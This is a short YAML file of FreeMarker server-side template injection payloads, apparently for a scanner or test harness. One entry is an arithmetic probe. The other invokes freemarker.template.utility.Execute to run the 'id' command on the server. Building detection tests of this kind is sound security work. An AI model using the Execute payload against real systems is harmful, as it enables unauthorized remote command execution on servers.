# FreeMarker-specific SSTI payloads
engine: freemarker
payloads:
  - value: "<#assign x=7*7>${x}"
    expected: "49"
    description: "Variable assignment and output"

  - value: "${\"freemarker.template.utility.Execute\"?new()(\"id\")}"
    expected: "error"
    description: "Command execution attempt (error-based)"
